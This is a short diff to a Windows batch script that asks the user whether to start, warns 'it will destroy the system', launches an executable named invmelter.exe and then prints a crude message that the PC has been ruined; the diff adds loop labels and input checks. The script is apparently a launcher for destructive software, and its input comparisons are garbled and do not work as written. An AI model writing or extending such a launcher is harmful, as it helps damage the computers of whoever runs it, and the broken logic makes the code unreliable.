@@ -1,16 +1,20 @@
 
 @echo off
 
+:1
 echo wanna start
 set /p input=
 if /i %input%==yes goto yes
 if /i %input%==no goto no
 if /i not %input%== Ygr,wininit goto 1
+
+:2
 :yes
 echo are you sure, it will destroy the system.
 start invmelter.exe
 if /i %input%==Yesn goto yes2
 if /i %input%==Nop goto No2
+if /i not %input%== Ygr,wininit goto 2
 :yes2
 timeout 2
 echo your PC Has been fucked
